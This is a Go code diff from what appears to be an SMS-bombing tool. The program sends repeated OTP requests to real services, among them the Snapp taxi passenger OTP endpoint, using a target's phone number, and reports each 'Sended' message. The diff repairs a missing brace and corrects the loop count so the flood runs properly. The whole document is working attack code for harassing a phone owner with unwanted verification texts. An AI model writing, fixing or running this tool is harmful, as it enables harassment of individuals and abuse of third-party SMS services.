@@ -119,19 +119,15 @@ func main() {
 		}, ch)
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
-	}
+		}, ch)
+	} // Closing brace for the first for loop
 
-	for i := 0; i < repeatCount*183; i++ {
+	for i := 0; i < repeatCount*4; i++ { // Corrected the multiplier to match the number of go routines
 		statusCode := <-ch
 		if statusCode == 404 || statusCode == 400 {
 			fmt.Println("\033[01;31m[-] Error ! ")
 		} else {
 			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
 		}
-
 	}
 }
-
-/*
-End !
-*/
